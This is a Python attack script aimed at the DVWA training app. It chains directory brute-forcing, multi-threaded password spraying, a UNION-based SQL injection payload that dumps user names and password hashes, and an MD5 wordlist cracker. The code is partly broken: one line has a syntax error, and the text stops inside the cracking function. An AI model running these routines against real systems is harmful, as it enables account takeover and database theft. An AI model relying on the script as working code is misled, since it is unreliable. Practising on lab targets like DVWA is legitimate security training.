#!/usr/bin/env python3
"""
DVWAsassin: Automated Security Assessment & Exploitation Framework for DVWA.
Features: Multi-threaded directory fuzzing, password spraying, SQL injection 
exfiltration, and an integrated offline cryptographic hash-cracking engine.
"""

import sys
import os
import re
import time
import logging
import argparse
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

# ==============================================================================
# LOGGING CONFIGURATION
# ==============================================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("security_audit.log", mode="w")
    ]
)

# ==============================================================================
# GLOBAL AUDIT FRAMEWORK CLASS
# ==============================================================================
class DVWASecurityAuditFramework:
    def __init__(self, target_ip, security_level="low", threads=10, wordlist="dirb.txt"):
        self.base_url = f"http://{target_ip}/dvwa/"
        self.login_url = self.base_url + "login.php"
        self.sqli_url = self.base_url + "vulnerabilities/sqli/"
        self.threads = threads
        self.wordlist_path = wordlist
        
        # Initialize resilient session object
        self.session = requests.Session()
        self.session.cookies.set("security", security_level)
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        })

    # --------------------------------------------------------------------------
    # MODULE 1: RECONNAISSANCE & WEB RECOVERY
    # --------------------------------------------------------------------------
    def verify_target(self):
        """Verifies host availability before launching intensive modules."""
        logging.info(f"Initiating target verification against: {self.login_url}")
        try:
            response = self.session.get(self.login_url, timeout=5)
            if response.status_code == 200:
                logging.info("[+] Target alive. Web platform accessible.")
                return True
            logging.error(f"[-] Host responded with anomalous status code: {response.status_code}")
            return False
        except requests.exceptions.RequestException as e:
            logging.critical(f"[!] Target unreachable or connection refused: {e}")
            return False

    def _fuzz_worker(self, path):
        """Worker thread logic for directory fuzzing."""
        url = f"{self.base_url}{path.strip()}"
        try:
            response = self.session.get(url, timeout=3, allow_redirects=False)
            if response.status_code in:
                return f"[+] Found Discovered Resource: {url} (Status: {response.status_code})"
        except requests.exceptions.RequestException:
            pass
        return None

    def concurrent_directory_fuzzing(self):
        """Orchestrates multi-threaded directory brute-forcing."""
        logging.info(f"Launching concurrent directory fuzzing (Threads: {self.threads})...")
        if not os.path.exists(self.wordlist_path):
            logging.warning(f"[-] Wordlist '{self.wordlist_path}' missing. Skipping fuzzing module.")
            return

        with open(self.wordlist_path, "r", errors="ignore") as f:
            paths = f.readlines()

        logging.info(f"Loaded {len(paths)} payloads from wordlist.")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._fuzz_worker, path) for path in paths]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    print(result)

    # --------------------------------------------------------------------------
    # MODULE 2: AUTHENTICATION AUDITING
    # --------------------------------------------------------------------------
    def _spray_worker(self, username, password):
        """Worker thread logic for brute-force password spraying."""
        try:
            # Create isolated sessions per thread context to prevent locking race conditions
            worker_session = requests.Session()
            worker_session.cookies.set("security", self.session.cookies.get("security"))
            worker_session.headers.update(self.session.headers)

            response = worker_session.post(self.login_url, data={
                "username": username,
                "password": password,
                "Login": "Login"
            }, timeout=3)
            
            if "index.php" in response.url:
                return (True, username, password)
        except requests.exceptions.RequestException:
            pass
        return (False, username, password)

    def concurrent_password_spray(self, u_file="usernames.txt", p_file="passwords.txt"):
        """Executes targeted password spray matrix across a ThreadPool."""
        logging.info("Initializing multi-threaded credential validation matrix...")
        if not os.path.exists(u_file) or not os.path.exists(p_file):
            logging.warning("[-] Credential dictionaries missing. Skipping authentication spray.")
            return

        with open(u_file) as f: usernames = [u.strip() for u in f if u.strip()]
        with open(p_file) as f: passwords = [p.strip() for p in f if p.strip()]

        logging.info(f"Targeting a total grid space of {len(usernames) * len(passwords)} pairs...")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for user in usernames:
                for pwd in passwords:
                    futures.append(executor.submit(self._spray_worker, user, pwd))
            
            for future in as_completed(futures):
                success, u, p = future.result()
                if success:
                    logging.info(f"[!!!] EXPLOIT SUCCESS: Valid Credentials Found -> {u}:{p}")

    def authenticate_global_session(self, user="admin", pwd="password"):
        """Authenticates core engine session to establish persistence for authenticated tasks."""
        logging.info(f"Authenticating master context utilizing proxy credentials -> {user}")
        try:
            response = self.session.post(self.login_url, data={
                "username": user,
                "password": pwd,
                "Login": "Login"
            }, timeout=5)
            if "index.php" in response.url:
                logging.info("[+] Session context token verified. Global cookie locked.")
                return True
            logging.error("[-] Master session rejected target credentials.")
            return False
        except requests.exceptions.RequestException as e:
            logging.critical(f"[!] Session connection breakdown: {e}")
            return False

    # --------------------------------------------------------------------------
    # MODULE 3: SQL INJECTION VULNERABILITY AUDITING & EXFILTRATION
    # --------------------------------------------------------------------------
    def run_sqli_data_extraction(self):
        """Injects payloads, regex parses databases, and hands results to local hash crackers."""
        logging.info("Deploying UNION-based database exfiltration arrays...")
        payload = "1' UNION SELECT user, password FROM users#"
        
        try:
            response = self.session.get(self.sqli_url, params={"id": payload, "Submit": "Submit"}, timeout=5)
            results = re.findall(r"First name:\s*(\w+).*?Surname:\s*(\w+)", response.text, re.DOTALL)
            
            if not results:
                logging.warning("[-] Injection payloads returned no structural matches. Check security settings.")
                return

            logging.info(f"[+] Harvested {len(results)} credential nodes from target database tables:")
            extracted_credentials = []
            
            for user, pwd_hash in results:
                print(f"    -> Node Extracted: [User: {user} | MD5 Hash: {pwd_hash}]")
                extracted_credentials.append((user, pwd_hash))
                
            # Automatically pivot into Module 4 (Offline Cracking Engine)
            self.offline_hash_cracker(extracted_credentials)

        except requests.exceptions.RequestException as e:
            logging.error(f"[!] Database communication disruption during exfiltration: {e}")

    # --------------------------------------------------------------------------
    # MODULE 4: AUTOMATED CRYPTOGRAPHIC HASH CRACKING
    # --------------------------------------------------------------------------
    def offline_hash_cracker(self, target_records, crack_list="passwords.txt"):
        """Performs optimized in-memory cryptographic lookup matches for extracted hashes."""
        logging.info("Initializing high-velocity local cryptographic recovery engine...")
        if not os.path.exists(crack_list):
            logging.warning(f"[-] Cracking directory list '{crack_list}' absent. Hash matching halted.")
            return

        with open(crack_list, "r", errors="ignore") as f:
            words = [w.strip() for w in f if w.strip()]

        # Generate a fast lookup map in memory for O(1) matching efficiency
        logging.info(f"Hashing local wordlist cache database ({len(words)} entries)...")
        rainbow_table = {}
        for word in words:
            word_hash = hashlib.md5(word.encode('utf-8')).hexdigest()
            rainbow_table[word_hash] = word
            
        logging.info("[*] Running hash comparisons...")
